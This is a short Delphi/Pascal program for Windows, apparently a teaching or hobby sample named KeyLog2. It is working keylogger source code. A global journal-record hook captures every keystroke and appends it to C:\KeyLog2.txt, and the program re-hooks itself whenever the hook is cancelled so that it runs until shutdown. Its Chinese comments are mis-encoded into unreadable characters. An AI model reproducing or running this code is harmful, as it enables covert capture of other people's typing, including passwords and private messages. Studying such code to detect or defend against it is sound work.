program KeyLog2;

uses Windows, Messages;

var JournalRecordHook: HHOOK;

 // ��¼���ӻص�����
function JournalRecordProc(nCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;
var
  Kbs: TKeyboardState;
  HFile: THandle;
  WChar: array[0..1] of Char;
  WSize: DWORD;
begin
 // lParamָ����Ϣ�ṹ, ����, �Ǽ��̰�����Ϣ
  if (nCode = HC_ACTION) and (PEventMsg(lParam).message = WM_KEYDOWN) then
  begin
   // ȡ����״̬
    GetKeyboardState(Kbs);

   // ת�����ַ�
    if ToAscii(PEventMsg(lParam).paramL, PEventMsg(lparam).paramH, Kbs, WChar, 0) = 1 then
    begin
     // ���ļ�
      HFile := CreateFile('C:\KeyLog2.txt', GENERIC_WRITE,
        FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

     // ����ַ�
      SetFilePointer(HFile, 0, nil, FILE_END);
      WriteFile(HFile, WChar[0] , 1, WSize, nil);

     // �س���#10
      if (WChar[0] = #13) then
      begin
        WChar[0] := #10;
        WriteFile(HFile, WChar[0] , 1, WSize, nil);
      end;

     // �رձ���
      CloseHandle(HFile);
    end;
  end;

 // ������һ�����Ӵ���, ���ҷ������ķ���ֵ
  Result := CallNextHookEx(JournalRecordHook, nCode, wParam, lParam);
end;

 // ~~~~~ ������� ~~~~~
var
  Msg: TMsg;
begin
 // ��װ����
  JournalRecordHook := SetWindowsHookEx(WH_JOURNALRECORD, @JournalRecordProc, HInstance, 0);

 // ��Ϣѭ��
  while GetMessage(Msg, 0, 0, 0) do
    if (Msg.message = WM_CANCELJOURNAL) then // ��ʱ��Ҫ���¹ҹ�
    begin
      JournalRecordHook :=
        SetWindowsHookEx(WH_JOURNALRECORD, @JournalRecordProc, HInstance, 0);
    end;

 // ж�ع���
  UnHookWindowsHookEx(JournalRecordHook);

 (* ע: ����������򲢲���������ͨ��Windows��������, �������ڲ����ڴ��ڹر�ʱ����PostQuitMessage(),
    ʹ��GetMessage()���ȡ��WM_QUIT����FALSE, ��������Ϣѭ��, ������������һֱ������ȥֱ���ػ� *)
end.